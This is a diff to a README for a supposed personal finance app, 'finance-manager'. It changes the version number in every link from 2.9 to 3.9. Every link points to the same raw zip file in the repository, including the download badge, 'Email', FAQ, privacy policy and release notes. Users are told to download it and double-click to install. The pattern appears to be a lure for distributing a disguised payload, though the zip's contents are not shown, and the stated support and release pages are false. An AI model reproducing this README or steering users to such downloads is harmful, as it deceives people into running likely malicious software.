@@ -1,6 +1,6 @@
 # 🎉 finance-manager - Easily Manage Your Personal Finances
 
-[![Download Now](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip)
+[![Download Now](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip)
 
 ## 📖 Overview
 The finance-manager is your go-to application for personal finance management. This tool helps you keep track of your expenses, set budgets, and monitor your financial health. With a user-friendly interface, managing finances becomes easier and more organized.
@@ -9,12 +9,12 @@ The finance-manager is your go-to application for personal finance management. T
 Follow these simple steps to download and run the finance-manager. No technical background is needed.
 
 ## 📥 Download & Install
-To download finance-manager, visit this page: [Download Finance Manager](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip).
+To download finance-manager, visit this page: [Download Finance Manager](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip).
 
 1. Open the link above in your web browser.
 2. You will see a list of available releases.
 3. Find the latest version of the finance-manager.
-4. Click on the asset name (e.g., `https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip`).
+4. Click on the asset name (e.g., `https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip`).
 5. The download will begin automatically.
 
 Once the download finishes, locate the file in your downloads folder and double-click to install. Follow the on-screen instructions to complete the installation.
@@ -44,14 +44,14 @@ Make sure your system meets these requirements to ensure a smooth experience.
 
 ## 📞 Support
 If you face any issues or have questions, feel free to reach out:
-- **Email:** https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip
-- **FAQs:** Check our [FAQ Page](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip) for common questions.
+- **Email:** https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip
+- **FAQs:** Check our [FAQ Page](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip) for common questions.
 
 ## 🛡️ Privacy Policy
-Your privacy is important to us. The finance-manager will not share your information with any third parties. For more details, see our [Privacy Policy](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip).
+Your privacy is important to us. The finance-manager will not share your information with any third parties. For more details, see our [Privacy Policy](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip).
 
 ## 🎉 Release Notes
-Check out the latest updates and new features in each release. Visit this page for detailed release notes: [Releases](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_2.9.zip).
+Check out the latest updates and new features in each release. Visit this page for detailed release notes: [Releases](https://raw.githubusercontent.com/nhuquynh1234789/finance-manager/master/backend/manager_finance_3.9.zip).
 
 ## ✉️ Feedback
 We value your input. Please share your experiences or suggestions to help us make finance-manager even better!
